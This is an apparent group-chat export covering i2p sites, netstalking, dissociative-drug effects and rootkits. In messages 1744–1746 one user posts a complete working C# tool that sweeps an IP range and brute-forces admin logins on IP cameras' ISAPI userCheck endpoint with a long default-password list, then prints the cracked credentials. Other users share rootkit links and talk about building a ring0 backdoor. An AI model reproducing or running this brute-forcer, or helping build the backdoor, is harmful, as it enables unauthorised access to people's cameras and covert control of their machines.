[
  {
    "messageId": 1699,
    "date": "2024-10-02T02:36:48.000Z",
    "text": "Passage version 2.3",
    "senderId": "1944901945",
    "senderUsername": "V3RDAD",
    "senderFirstName": "P.B. V3RDAD",
    "senderLastName": null
  },
  {
    "messageId": 1700,
    "date": "2024-10-02T02:36:59.000Z",
    "text": "Hosts.txt file in the works",
    "senderId": "1944901945",
    "senderUsername": "V3RDAD",
    "senderFirstName": "P.B. V3RDAD",
    "senderLastName": null
  },
  {
    "messageId": 1701,
    "date": "2024-10-02T02:37:45.000Z",
    "text": "enjoy",
    "senderId": "1944901945",
    "senderUsername": "V3RDAD",
    "senderFirstName": "P.B. V3RDAD",
    "senderLastName": null
  },
  {
    "messageId": 1702,
    "date": "2024-10-02T02:45:02.000Z",
    "text": "for debian/linux",
    "senderId": "1944901945",
    "senderUsername": "V3RDAD",
    "senderFirstName": "P.B. V3RDAD",
    "senderLastName": null
  },
  {
    "messageId": 1703,
    "date": "2024-10-02T02:45:03.000Z",
    "text": "",
    "senderId": "1944901945",
    "senderUsername": "V3RDAD",
    "senderFirstName": "P.B. V3RDAD",
    "senderLastName": null
  },
  {
    "messageId": 1704,
    "date": "2024-10-02T02:45:03.000Z",
    "text": "",
    "senderId": "1944901945",
    "senderUsername": "V3RDAD",
    "senderFirstName": "P.B. V3RDAD",
    "senderLastName": null
  },
  {
    "messageId": 1705,
    "date": "2024-10-02T02:45:14.000Z",
    "text": "@darkfantxsy",
    "senderId": "1944901945",
    "senderUsername": "V3RDAD",
    "senderFirstName": "P.B. V3RDAD",
    "senderLastName": null
  },
  {
    "messageId": 1707,
    "date": "2024-10-02T03:47:36.000Z",
    "text": "http://lo7z8aqfx.lll/",
    "senderId": "1944901945",
    "senderUsername": "V3RDAD",
    "senderFirstName": "P.B. V3RDAD",
    "senderLastName": null
  },
  {
    "messageId": 1710,
    "date": "2024-10-02T08:01:59.000Z",
    "text": "https://dnsdumpster.com/",
    "senderId": "1944901945",
    "senderUsername": "V3RDAD",
    "senderFirstName": "P.B. V3RDAD",
    "senderLastName": null
  },
  {
    "messageId": 1711,
    "date": "2024-10-02T08:02:51.000Z",
    "text": "",
    "senderId": "6684621134",
    "senderUsername": null,
    "senderFirstName": "Vivienne",
    "senderLastName": null
  },
  {
    "messageId": 1712,
    "date": "2024-10-02T08:03:22.000Z",
    "text": "",
    "senderId": "6684621134",
    "senderUsername": null,
    "senderFirstName": "Vivienne",
    "senderLastName": null
  },
  {
    "messageId": 1713,
    "date": "2024-10-02T09:42:11.000Z",
    "text": "you can talk now",
    "senderId": "1944901945",
    "senderUsername": "V3RDAD",
    "senderFirstName": "P.B. V3RDAD",
    "senderLastName": null
  },
  {
    "messageId": 1714,
    "date": "2024-10-02T10:30:30.000Z",
    "text": ""
  },
  {
    "messageId": 1715,
    "date": "2024-10-02T10:30:30.000Z",
    "text": ""
  },
  {
    "messageId": 1716,
    "date": "2024-10-02T10:30:30.000Z",
    "text": ""
  },
  {
    "messageId": 1717,
    "date": "2024-10-02T10:33:44.000Z",
    "text": ""
  },
  {
    "messageId": 1718,
    "date": "2024-10-02T10:36:33.000Z",
    "text": ""
  },
  {
    "messageId": 1720,
    "date": "2024-10-02T11:37:30.000Z",
    "text": "chinese ?",
    "senderId": "692033960",
    "senderUsername": "Jan3891",
    "senderFirstName": "Jan__",
    "senderLastName": null
  },
  {
    "messageId": 1721,
    "date": "2024-10-02T11:38:23.000Z",
    "text": "",
    "senderId": "6393669838",
    "senderUsername": "rebekii",
    "senderFirstName": "rebeki",
    "senderLastName": null
  },
  {
    "messageId": 1722,
    "date": "2024-10-02T11:40:53.000Z",
    "text": ""
  },
  {
    "messageId": 1723,
    "date": "2024-10-02T11:57:54.000Z",
    "text": "lmao did you mute him again?",
    "senderId": "1944901945",
    "senderUsername": "V3RDAD",
    "senderFirstName": "P.B. V3RDAD",
    "senderLastName": null
  },
  {
    "messageId": 1724,
    "date": "2024-10-02T11:58:46.000Z",
    "text": "!q get the SMILES code for oxydopamine",
    "senderId": "5020506796",
    "senderUsername": null,
    "senderFirstName": "γnɿɘƨ",
    "senderLastName": null
  },
  {
    "messageId": 1726,
    "date": "2024-10-02T11:59:21.000Z",
    "text": "No"
  },
  {
    "messageId": 1727,
    "date": "2024-10-02T12:00:00.000Z",
    "text": ""
  },
  {
    "messageId": 1728,
    "date": "2024-10-02T12:00:02.000Z",
    "text": "Dead wrong",
    "senderId": "5020506796",
    "senderUsername": null,
    "senderFirstName": "γnɿɘƨ",
    "senderLastName": null
  },
  {
    "messageId": 1730,
    "date": "2024-10-02T12:02:27.000Z",
    "text": "I don't know if I should say something...",
    "senderId": "7958247969",
    "senderUsername": null,
    "senderFirstName": "DarkAlgorithm",
    "senderLastName": null
  },
  {
    "messageId": 1731,
    "date": "2024-10-02T12:03:09.000Z",
    "text": "!q what is meant by the Creation Network? why is this a common concept that people believe to gain an understanding of under dissociative?",
    "senderId": "5020506796",
    "senderUsername": null,
    "senderFirstName": "γnɿɘƨ",
    "senderLastName": null
  },
  {
    "messageId": 1733,
    "date": "2024-10-02T12:04:11.000Z",
    "text": "!q What is \"the matrix\" in the context of subjective effects? why is this a common concept that people believe to gain an understanding of under dissociative?",
    "senderId": "5020506796",
    "senderUsername": null,
    "senderFirstName": "γnɿɘƨ",
    "senderLastName": null
  },
  {
    "messageId": 1735,
    "date": "2024-10-02T12:05:01.000Z",
    "text": "@V3RDAD second paragraph",
    "senderId": "5020506796",
    "senderUsername": null,
    "senderFirstName": "γnɿɘƨ",
    "senderLastName": null
  },
  {
    "messageId": 1737,
    "date": "2024-10-02T12:06:07.000Z",
    "text": "!q \"Data Corruption\" as a subjective effect",
    "senderId": "5020506796",
    "senderUsername": null,
    "senderFirstName": "γnɿɘƨ",
    "senderLastName": null
  },
  {
    "messageId": 1739,
    "date": "2024-10-02T12:07:04.000Z",
    "text": "nice",
    "senderId": "1944901945",
    "senderUsername": "V3RDAD",
    "senderFirstName": "P.B. V3RDAD",
    "senderLastName": null
  },
  {
    "messageId": 1740,
    "date": "2024-10-02T12:07:34.000Z",
    "text": "!q establish a connection between stochastic processes, violation of dynamical systems, and fractals in classical mechanics. If you can write it both as a philosophical theory with mathematical examples.",
    "senderId": "1944901945",
    "senderUsername": "V3RDAD",
    "senderFirstName": "P.B. V3RDAD",
    "senderLastName": null
  },
  {
    "messageId": 1742,
    "date": "2024-10-02T16:10:48.000Z",
    "text": "Is V3RDAD the i2p+ administrator?",
    "senderId": "7958247969",
    "senderUsername": null,
    "senderFirstName": "DarkAlgorithm",
    "senderLastName": null
  },
  {
    "messageId": 1743,
    "date": "2024-10-02T16:11:57.000Z",
    "text": "only of the websites on passage",
    "senderId": "1944901945",
    "senderUsername": "V3RDAD",
    "senderFirstName": "P.B. V3RDAD",
    "senderLastName": null
  },
  {
    "messageId": 1744,
    "date": "2024-10-02T16:28:09.000Z",
    "text": "Vivienne if you want to explore netstalking ,you can use that initially , simple script for brute forcing cams , I coded that a long ago (2019-2020) . \nusing System;\nusing System.Threading.Tasks;\nusing System.Net.Http;\nusing System.Net;\nusing System.IO;\nusing System.Threading;\nusing System.Collections.Generic;\nusing System.Xml;\n\n\n\n\n\n\nnamespace ConsoleApp7\n{\n    class Program\n    {\n        class WorkState\n        {\n            public string Url;\n            public CountdownEvent Countdown;\n\n            public WorkState(string url, CountdownEvent countdown)\n            {\n                Url = url;\n                Countdown = countdown;\n            }\n        }\n\n        public static IEnumerable<string> Ipgen(string ip, string mask)\n        {\n            int mk = Convert.ToInt32(mask);\n            string[] ip_p = ip.Split('.');\n            int ipint = (Convert.ToInt32(ip_p[0]) << 24) + (Convert.ToInt32(ip_p[1]) << 16) + (Convert.ToInt32(ip_p[2]) << 8) + (Convert.ToInt32(ip_p[3]) << 0);\n            int net_b = (ipint >> (32 - mk)) << (32 - mk);\n            for (int x = 0; x < (1 << (32 - mk)); x++)\n            {\n                int ip_o = net_b + x;\n                string ip_c = String.Format(\"{0}.{1}.{2}.{3}\", ((ip_o >> 24) & 255), ((ip_o >> 16) & 255), ((ip_o >> 8) & 255), ((ip_o >> 0) & 255));\n                yield return ip_c;\n\n            }\n\n\n        }\n\n        static void Main(string[] args)\n\n        {\n            var dt_p = DateTime.Now;\n            Console.Write(\"IP : \");\n            string ip_add = Console.ReadLine();\n            Console.Write(\"MASK : \");\n            string mask = Console.ReadLine();\n            Console.Write(\"Threads : \");\n            string T_count = Console.ReadLine();\n            int t_count = Convert.ToInt32(T_count);\n            ThreadPool.SetMaxThreads(t_count, t_count);\n\n            var ipt = Ipgen(ip_add, mask);\n            int ips_n = 1 << (32 - Convert.ToInt32(mask));\n            CountdownEvent countdown = new CountdownEvent(ips_n);\n            foreach (var ip_i in ipt)\n            {\n                var state = new WorkState(ip_i, countdown);\n                ThreadPool.QueueUserWorkItem(new WaitCallback(Handle), state);\n            }\n\n            countdown.Wait();\n            var dt_n = DateTime.Now;\n            double op_t=(dt_n - dt_p).TotalSeconds;\n            Console.WriteLine(op_t);\n            Console.ReadLine();\n\n\n        }",
    "senderId": "692033960",
    "senderUsername": "Jan3891",
    "senderFirstName": "Jan__",
    "senderLastName": null
  },
  {
    "messageId": 1745,
    "date": "2024-10-02T16:28:09.000Z",
    "text": "public static async void Handle(object state)\n        {\n            var workState = (WorkState)state;\n            string url1 = workState.Url;\n            List<int> ports = new List<int> { 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 8000, 8080, 8081 };\n            List<string> users = new List<string> { \"admin\" };\n            //List<string> passd = new List<string> { \"admin\", \"admin123\", \"admin1234\", \"admin12345\",\"abcd1234\", \"hd543211\" , \"Admin123\" , \"Admin1234\", \"Admin12345\" ,\"abc123\", \"12345a\", \"12345q\",\"123abc\", \"qly022\" };\n            List<string> passd = new List<string> { \"admin\", \"admin1\", \"admin123\", \"admin1234\", \"admin12345\", \"admin123456\", \"Admin1\", \"Admin12\", \"Admin123\", \"Admin1234\", \"Admin12345\", \"Admin123456\", \"ADMIN\", \"ADMIN1\", \"ADMIN12\", \"ADMIN123\", \"ADMIN1234\", \"ADMIN12345\", \"ADMIN123456\", \"1111\", \"1234\", \"12345\", \"123456\", \"1234567\", \"12345678\", \"abc1\", \"abc12\", \"abc123\", \"abc1234\", \"abc12345\", \"abc123456\", \"Abc1\", \"Abc12\", \"Abc123\", \"Abc1234\", \"Abc12345\", \"Abc123456\", \"abcd1\", \"abcd12\", \"abcd123\", \"abcd1234\", \"abcd12345\", \"abcd123456\", \"Abcd1\", \"Abcd12\", \"Abcd123\", \"Abcd1234\", \"Abcd12345\", \"Abcd123456\", \"1abc\", \"12abc\", \"123abc\", \"1234abc\", \"12345abc\", \"123456abc\", \"1Abc\", \"12Abc\", \"123Abc\", \"1234Abc\", \"12345Abc\", \"123456Abc\", \"hik1\", \"hik12\", \"hik123\", \"hik1234\", \"hik12345\", \"hik123456\", \"Hik1\", \"Hik12\", \"Hik123\", \"Hik1234\", \"Hik12345\", \"Hik123456\", \"123A\", \"1234A\", \"12345A\", \"123456A\", \"1234567A\", \"12345678A\", \"A12345678\", \"A123\", \"A1234\", \"A12345\", \"A123456\", \"A1234567\", \"A12345678\", \"123m\", \"1234m\", \"12345m\", \"123456m\", \"1234567m\", \"12345678m\", \"a1234567\", \"a12345678\", \"a123456789\", \"a7654321\", \"a76543210\", \"123q\", \"1234q\", \"12345q\", \"123456q\", \"1234567q\", \"12345678q\", \"a1b2c3d4\", \"hd543211\", \"qwerty1\", \"qwerty12\", \"qwerty123\", \"qwerty1234\", \"qwerty12345\", \"qwerty123456\", \"qwerty1234567\", \"Qwerty1\", \"Qwerty123\", \"Qwerty1234\", \"Qwerty12345\", \"Qwerty123456\", \"Qwerty1234567\", \"1qwerty\", \"12werty\", \"123qwerty\", \"1234qwerty\", \"12345qwerty\", \"12346qwerty\", \"1234567qwerty\", \"12345678qwerty\", \"12345a\", \"qly022\", \"9999\", \"fliradmin\", \"0000\", \"jvc\", \"4321\", \"1111111\", \"4321\", \"password\", \"ikwd\", \"666666\", \"qwer1234\", \"123456789\" };\n \n            CountdownEvent countdown = workState.Countdown;\n            string ex = \"/ISAPI/Security/userCheck\";\n            int cs = 0;\n            foreach (var port in ports)\n            {\n                int cn = 0;\n                foreach (var us in users)\n                {\n                    foreach (var ps in passd)\n                    {\n                        string url2 = String.Format(\"http://{0}:{1}{2}\", url1, port, ex);\n                        try\n                        {\n                            using (var client = new HttpClient())\n                            {\n                                client.Timeout = TimeSpan.FromSeconds(5);\n                                client.DefaultRequestHeaders.ConnectionClose = true;\n                                client.DefaultRequestHeaders.TryAddWithoutValidation(\"User-Agent\", \"Firefox\");\n                                client.DefaultRequestHeaders.TryAddWithoutValidation(\"Accept\", \"*/*\");\n                                string auth_t = String.Format(\"{0}:{1}\", us, ps);\n                                var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(auth_t);\n                                var base_s = System.Convert.ToBase64String(plainTextBytes);\n                                string autho = String.Format(\"Basic {0}\", base_s);\n                                client.DefaultRequestHeaders.TryAddWithoutValidation(\"Authorization\", autho);",
    "senderId": "692033960",
    "senderUsername": "Jan3891",
    "senderFirstName": "Jan__",
    "senderLastName": null
  },
  {
    "messageId": 1746,
    "date": "2024-10-02T16:28:10.000Z",
    "text": "var response = await client.GetAsync(url2);\n                                string contents;\n                                using (var responseStream = await response.Content.ReadAsStreamAsync())\n                                using (var streamReader = new StreamReader(responseStream))\n                                {\n                                    contents = streamReader.ReadToEnd();\n                                }\n                                try\n                                {\n                                    XmlDocument doc = new XmlDocument();\n                                    doc.LoadXml(contents);\n                                    if (doc.SelectSingleNode(\"//userCheck\") == null)\n                                    {\n                                        cn = 1;\n                                        break;\n                                    }\n                                    else\n                                    {\n                                        XmlNode node = doc.SelectSingleNode(\"/userCheck/statusValue\");\n                                        var status_value = Convert.ToInt32(node.InnerText);\n                                       \n                                        if (status_value == 200)\n                                        {\n\n                                            Console.WriteLine(\"{0} {1}\", url2, auth_t);\n                                            //Console.WriteLine(contents);\n                                            cs = 1;\n                                            cn = 1;\n                                            break;\n\n                                        }else if (ps==passd[passd.Count-1])\n                                        {\n                                            Console.WriteLine(url2);\n                                        }\n\n\n\n\n                                    }\n                                }\n                                catch (Exception)\n                                {\n\n                                    cn = 1;\n                                    break;\n\n                                }\n\n                            }\n\n\n\n                        }\n                        catch (Exception)\n\n                        {\n\n                            cn = 1;\n                            break;\n                        }\n                    }\n                    if (cn == 1)\n                    {\n                        break;\n                    }\n                }\n                if (cs == 1)\n                {\n                    break;\n                }\n\n            }\n\n            countdown.Signal();\n\n\n\n        }\n    }\n}",
    "senderId": "692033960",
    "senderUsername": "Jan3891",
    "senderFirstName": "Jan__",
    "senderLastName": null
  },
  {
    "messageId": 1747,
    "date": "2024-10-02T16:32:31.000Z",
    "text": "What is the connection between netstatlking and coding?",
    "senderId": "7958247969",
    "senderUsername": null,
    "senderFirstName": "DarkAlgorithm",
    "senderLastName": null
  },
  {
    "messageId": 1748,
    "date": "2024-10-02T16:35:14.000Z",
    "text": "https://en.wikipedia.org/wiki/Netstalking",
    "senderId": "692033960",
    "senderUsername": "Jan3891",
    "senderFirstName": "Jan__",
    "senderLastName": null
  },
  {
    "messageId": 1749,
    "date": "2024-10-02T16:35:21.000Z",
    "text": "look at the definition",
    "senderId": "692033960",
    "senderUsername": "Jan3891",
    "senderFirstName": "Jan__",
    "senderLastName": null
  },
  {
    "messageId": 1750,
    "date": "2024-10-02T16:36:43.000Z",
    "text": "I know very well what I know",
    "senderId": "7958247969",
    "senderUsername": null,
    "senderFirstName": "DarkAlgorithm",
    "senderLastName": null
  },
  {
    "messageId": 1751,
    "date": "2024-10-02T16:38:05.000Z",
    "text": "exploring networks and devices requires coding",
    "senderId": "692033960",
    "senderUsername": "Jan3891",
    "senderFirstName": "Jan__",
    "senderLastName": null
  },
  {
    "messageId": 1752,
    "date": "2024-10-02T16:58:32.000Z",
    "text": "nice thanks for sharing",
    "senderId": "1944901945",
    "senderUsername": "V3RDAD",
    "senderFirstName": "P.B. V3RDAD",
    "senderLastName": null
  },
  {
    "messageId": 1753,
    "date": "2024-10-02T17:37:29.000Z",
    "text": "No, I checked and it works on both distros",
    "senderId": "1944901945",
    "senderUsername": "V3RDAD",
    "senderFirstName": "P.B. V3RDAD",
    "senderLastName": null
  },
  {
    "messageId": 1754,
    "date": "2024-10-02T17:37:32.000Z",
    "text": "",
    "senderId": "1944901945",
    "senderUsername": "V3RDAD",
    "senderFirstName": "P.B. V3RDAD",
    "senderLastName": null
  },
  {
    "messageId": 1755,
    "date": "2024-10-02T17:37:48.000Z",
    "text": "the speed is around tor's speed",
    "senderId": "1944901945",
    "senderUsername": "V3RDAD",
    "senderFirstName": "P.B. V3RDAD",
    "senderLastName": null
  },
  {
    "messageId": 1756,
    "date": "2024-10-02T18:13:31.000Z",
    "text": "That could be possible if we try to write a AI program powered by Claude 3.5 Sonnet that can reverse engineer whole asm files into C, but context length is the problem.",
    "senderId": "1168194068",
    "senderUsername": null,
    "senderFirstName": "Jazmin",
    "senderLastName": null
  },
  {
    "messageId": 1757,
    "date": "2024-10-02T18:18:15.000Z",
    "text": "This is not ring0 but ring3: https://github.com/coldpon/ring3-hidden/",
    "senderId": "1168194068",
    "senderUsername": null,
    "senderFirstName": "Jazmin",
    "senderLastName": null
  },
  {
    "messageId": 1758,
    "date": "2024-10-02T18:18:27.000Z",
    "text": "no",
    "senderId": "6684621134",
    "senderUsername": null,
    "senderFirstName": "Vivienne",
    "senderLastName": null
  },
  {
    "messageId": 1759,
    "date": "2024-10-02T18:18:35.000Z",
    "text": "I want ring0",
    "senderId": "6684621134",
    "senderUsername": null,
    "senderFirstName": "Vivienne",
    "senderLastName": null
  },
  {
    "messageId": 1760,
    "date": "2024-10-02T18:18:46.000Z",
    "text": "I don't like ring3",
    "senderId": "6684621134",
    "senderUsername": null,
    "senderFirstName": "Vivienne",
    "senderLastName": null
  },
  {
    "messageId": 1761,
    "date": "2024-10-02T18:19:48.000Z",
    "text": "Ring0 Rootkit: https://github.com/XaFF-XaFF/Cronos-Rootkit",
    "senderId": "1168194068",
    "senderUsername": null,
    "senderFirstName": "Jazmin",
    "senderLastName": null
  },
  {
    "messageId": 1762,
    "date": "2024-10-02T18:20:23.000Z",
    "text": "can it hack into ring0?",
    "senderId": "6684621134",
    "senderUsername": null,
    "senderFirstName": "Vivienne",
    "senderLastName": null
  },
  {
    "messageId": 1763,
    "date": "2024-10-02T18:20:33.000Z",
    "text": "I want to write a backdoor to ring0",
    "senderId": "6684621134",
    "senderUsername": null,
    "senderFirstName": "Vivienne",
    "senderLastName": null
  },
  {
    "messageId": 1764,
    "date": "2024-10-02T18:21:00.000Z",
    "text": "You can, You just need to build on top of the rootkit.",
    "senderId": "1168194068",
    "senderUsername": null,
    "senderFirstName": "Jazmin",
    "senderLastName": null
  },
  {
    "messageId": 1765,
    "date": "2024-10-02T18:21:30.000Z",
    "text": "so make a friend?",
    "senderId": "6684621134",
    "senderUsername": null,
    "senderFirstName": "Vivienne",
    "senderLastName": null
  },
  {
    "messageId": 1766,
    "date": "2024-10-02T18:21:33.000Z",
    "text": "bro",
    "senderId": "6684621134",
    "senderUsername": null,
    "senderFirstName": "Vivienne",
    "senderLastName": null
  }
]